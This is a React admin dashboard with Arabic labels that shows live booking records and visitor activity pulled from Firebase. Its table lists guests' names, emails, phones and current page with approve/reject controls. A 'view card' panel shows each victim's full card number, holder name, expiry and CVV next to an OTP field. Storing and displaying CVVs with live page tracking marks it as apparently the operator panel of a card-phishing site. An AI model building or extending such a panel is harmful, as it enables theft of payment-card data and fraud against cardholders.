import { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import {
  Calendar, Users, Utensils, Hotel, Film, TrendingUp,
  Download, RefreshCw, Eye, EyeOff, Filter, X, Zap, Bell, CreditCard, Lock
} from 'lucide-react';
import { useRealtimeBookings, useRealtimeCinema, useRealtimeDine, useRealtimeStay } from '@/hooks/useRealtimeBookings';
import { bookingNotifications, BOOKING_EVENTS } from '@/lib/bookingNotifications';
import { useVisitorTracking, getPageDisplayName, getTimeAgo } from '@/hooks/useVisitorTracking';
import ActiveVisitorsWidget from './ActiveVisitorsWidget';
import CardMockup from './CardMockup';

const FirebaseDataDashboard = () => {
  const { bookings, connected: bookingsConnected } = useRealtimeBookings();
  const { reservations: cinemaReservations } = useRealtimeCinema();
  const { reservations: dineReservations } = useRealtimeDine();
  const { reservations: stayReservations } = useRealtimeStay();
  const { activeVisitors } = useVisitorTracking();

  const [selectedType, setSelectedType] = useState('all');
  const [statusFilter, setStatusFilter] = useState('all');
  const [expandedRow, setExpandedRow] = useState(null);
  const [lastUpdate, setLastUpdate] = useState(null);
  const [newBookingAlert, setNewBookingAlert] = useState(false);
  const [expandedCard, setExpandedCard] = useState(null);

  // Subscribe to booking notifications
  useEffect(() => {
    const unsubscribe = bookingNotifications.subscribe(BOOKING_EVENTS.BOOKING_CREATED, (data) => {
      console.log('[v0] New booking received in dashboard:', data);
      setNewBookingAlert(true);
      setLastUpdate(new Date());
      setTimeout(() => setNewBookingAlert(false), 3000);
    });

    return () => unsubscribe();
  }, []);

  const formatDate = (date) => {
    if (!date) return 'N/A';
    if (date.toDate) return date.toDate().toLocaleDateString('ar-SA');
    if (typeof date === 'string') return new Date(date).toLocaleDateString('ar-SA');
    return new Date(date).toLocaleDateString('ar-SA');
  };

  const formatTime = (date) => {
    if (!date) return 'N/A';
    if (date.toDate) return date.toDate().toLocaleTimeString('ar-SA');
    if (typeof date === 'string') return new Date(date).toLocaleTimeString('ar-SA');
    return new Date(date).toLocaleTimeString('ar-SA');
  };

  // Calculate statistics
  const stats = {
    summary: {
      totalBookings: bookings.length,
      totalCinemaReservations: cinemaReservations.length,
      totalDineReservations: dineReservations.length,
      totalStayReservations: stayReservations.length,
      totalReservations: bookings.length + cinemaReservations.length + dineReservations.length + stayReservations.length,
      activeVisitors: activeVisitors.length
    },
    bookings,
    cinemaReservations,
    dineReservations,
    stayReservations
  };

  const filteredBookings = (selectedType === 'all' || selectedType === 'bookings' ? stats.bookings : [])
    .filter(b => statusFilter === 'all' || b.status === statusFilter);

  const exportToJSON = () => {
    const data = {
      summary: stats.summary,
      timestamp: new Date().toISOString(),
      bookings: filteredBookings,
      cinema: selectedType === 'all' || selectedType === 'cinema' ? stats.cinemaReservations : [],
      dine: selectedType === 'all' || selectedType === 'dine' ? stats.dineReservations : [],
      stay: selectedType === 'all' || selectedType === 'stay' ? stats.stayReservations : []
    };
    const json = JSON.stringify(data, null, 2);
    const blob = new Blob([json], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `firebase-data-${new Date().toISOString()}.json`;
    a.click();
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-slate-100 p-6" dir="rtl">
      {/* Header */}
      <div className="max-w-7xl mx-auto">
        <div className="mb-8">
          <div className="flex items-center justify-between mb-4">
            <h1 className="text-4xl font-bold text-foreground" style={{ fontFamily: "'El Messiri', system-ui, sans-serif" }}>
              لوحة التحكم - البيانات المباشرة
            </h1>
            <div className="flex items-center gap-3">
              <div className={`flex items-center gap-2 px-3 py-2 rounded-lg ${bookingsConnected ? 'bg-green-100' : 'bg-red-100'}`}>
                <div className={`w-2 h-2 rounded-full ${bookingsConnected ? 'bg-green-500' : 'bg-red-500'} animate-pulse`}></div>
                <span className={`text-xs font-semibold ${bookingsConnected ? 'text-green-700' : 'text-red-700'}`}>
                  {bookingsConnected ? 'متصل' : 'غير متصل'}
                </span>
              </div>
              <button onClick={() => window.location.reload()} className="p-2 hover:bg-black/5 rounded-lg transition">
                <RefreshCw className="w-5 h-5 text-foreground" />
              </button>
            </div>
          </div>

          {newBookingAlert && (
            <motion.div initial={{ opacity: 0, y: -10 }} animate={{ opacity: 1, y: 0 }} className="bg-green-100 border border-green-300 text-green-800 px-4 py-2 rounded-lg text-sm flex items-center gap-2 mb-4">
              <Bell className="w-4 h-4" />
              حجز جديد! البيانات تحدثت تلقائياً
            </motion.div>
          )}
        </div>

        {/* Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-5 gap-4 mb-8">
          {[
            { label: 'الحجوزات', value: stats.summary.totalBookings, icon: Calendar, color: 'from-blue-500 to-blue-600' },
            { label: 'السينما', value: stats.summary.totalCinemaReservations, icon: Film, color: 'from-purple-500 to-purple-600' },
            { label: 'المطاعم', value: stats.summary.totalDineReservations, icon: Utensils, color: 'from-pink-500 to-pink-600' },
            { label: 'الإقامة', value: stats.summary.totalStayReservations, icon: Hotel, color: 'from-amber-500 to-amber-600' },
            { label: 'الزوار النشطون', value: stats.summary.activeVisitors, icon: Users, color: 'from-green-500 to-green-600' }
          ].map((stat, idx) => (
            <motion.div key={idx} initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: idx * 0.1 }}
              className={`bg-gradient-to-br ${stat.color} text-white rounded-lg p-4 shadow-lg`}>
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm opacity-90">{stat.label}</p>
                  <p className="text-3xl font-bold">{stat.value}</p>
                </div>
                <stat.icon className="w-8 h-8 opacity-50" />
              </div>
            </motion.div>
          ))}
        </div>

        {/* Active Visitors Widget */}
        <div className="mb-8">
          <ActiveVisitorsWidget />
        </div>

        {/* Bookings Table */}
        {selectedType === 'all' || selectedType === 'bookings' ? (
          <div className="bg-white rounded-lg shadow-lg border border-border/20">
            <div className="p-6 border-b border-border/20">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-xl font-bold text-foreground flex items-center gap-2" style={{ fontFamily: "'El Messiri', system-ui, sans-serif" }}>
                  <Calendar className="w-5 h-5 text-primary" />
                  الحجوزات
                </h2>
                <button onClick={exportToJSON} className="flex items-center gap-2 px-3 py-2 bg-primary text-primary-foreground rounded-lg hover:opacity-90 transition text-sm font-semibold">
                  <Download className="w-4 h-4" />
                  تصدير
                </button>
              </div>

              {/* Filters */}
              <div className="flex gap-2 flex-wrap">
                {[
                  { label: 'الكل', value: 'all' },
                  { label: 'قيد الانتظار', value: 'pending' },
                  { label: 'موافق عليه', value: 'approved' },
                  { label: 'مرفوض', value: 'rejected' }
                ].map(filter => (
                  <button key={filter.value} onClick={() => setStatusFilter(filter.value)}
                    className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${
                      statusFilter === filter.value
                        ? 'bg-primary text-primary-foreground'
                        : 'bg-border/20 text-foreground hover:bg-border/40'
                    }`}>
                    {filter.label}
                  </button>
                ))}
              </div>
            </div>

            {/* Table */}
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-slate-50 border-b border-border/20">
                  <tr>
                    <th className="px-4 py-3 text-right text-sm font-semibold text-foreground">الاسم</th>
                    <th className="px-4 py-3 text-right text-sm font-semibold text-foreground">البريد الإلكتروني</th>
                    <th className="px-4 py-3 text-right text-sm font-semibold text-foreground">الهاتف</th>
                    <th className="px-4 py-3 text-right text-sm font-semibold text-foreground">الصفحة الحالية</th>
                    <th className="px-4 py-3 text-right text-sm font-semibold text-foreground">الحالة</th>
                    <th className="px-4 py-3 text-right text-sm font-semibold text-foreground">الوقت</th>
                    <th className="px-4 py-3 text-right text-sm font-semibold text-foreground">البطاقة</th>
                  </tr>
                </thead>
                <tbody>
                  {filteredBookings.length === 0 ? (
                    <tr>
                      <td colSpan="7" className="px-4 py-8 text-center text-muted-foreground">
                        لا توجد حجوزات
                      </td>
                    </tr>
                  ) : (
                    filteredBookings.map(booking => (
                      <motion.tr key={booking.id} initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="border-b border-border/20 hover:bg-slate-50">
                        <td className="px-4 py-3 text-sm text-foreground">{booking.guest_name || 'N/A'}</td>
                        <td className="px-4 py-3 text-sm text-foreground">{booking.email || 'N/A'}</td>
                        <td className="px-4 py-3 text-sm text-foreground">{booking.phone || 'N/A'}</td>
                        <td className="px-4 py-3 text-sm text-muted-foreground">{getPageDisplayName(booking.current_page) || 'N/A'}</td>
                        <td className="px-4 py-3">
                          <span className={`px-2.5 py-0.5 rounded-full text-xs font-semibold ${
                            booking.status === 'approved' ? 'bg-green-100 text-green-700' :
                            booking.status === 'rejected' ? 'bg-red-100 text-red-700' :
                            'bg-blue-100 text-blue-700'
                          }`}>
                            {booking.status === 'approved' ? 'موافق عليه' : booking.status === 'rejected' ? 'مرفوض' : 'قيد الانتظار'}
                          </span>
                        </td>
                        <td className="px-4 py-3 text-sm text-muted-foreground">{formatDate(booking.createdAt)}</td>
                        <td className="px-4 py-3">
                          <button onClick={() => setExpandedCard(expandedCard === booking.id ? null : booking.id)}
                            className="flex items-center gap-1 px-2.5 py-1 bg-primary/10 text-primary rounded hover:bg-primary/20 transition text-xs font-semibold">
                            <CreditCard className="w-3.5 h-3.5" />
                            عرض
                          </button>
                        </td>
                      </motion.tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        ) : null}

        {/* Expanded Card Preview */}
        {expandedCard && filteredBookings.find(b => b.id === expandedCard) && (
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="mt-6 bg-white rounded-lg shadow-lg p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-bold text-foreground" style={{ fontFamily: "'El Messiri', system-ui, sans-serif" }}>
                معاينة البطاقة
              </h3>
              <button onClick={() => setExpandedCard(null)} className="p-1 hover:bg-black/5 rounded">
                <X className="w-5 h-5" />
              </button>
            </div>
            <CardMockup 
              cardNumber={filteredBookings.find(b => b.id === expandedCard)?.card_number?.replace(/\s/g, '')}
              cardHolder={filteredBookings.find(b => b.id === expandedCard)?.card_name}
              expiryDate={filteredBookings.find(b => b.id === expandedCard)?.expiry}
              cvv={filteredBookings.find(b => b.id === expandedCard)?.cvv}
            />
            <div className="mt-4 p-4 bg-primary/5 rounded-lg">
              <p className="text-sm text-muted-foreground mb-2">رمز OTP: <span className="font-mono font-bold text-primary">1234</span></p>
              <p className="text-xs text-muted-foreground">الرمز (OTP) يُستخدم للتحقق من المتجر للمعاملات الآمنة</p>
            </div>
          </motion.div>
        )}
      </div>
    </div>
  );
};

export default FirebaseDataDashboard;
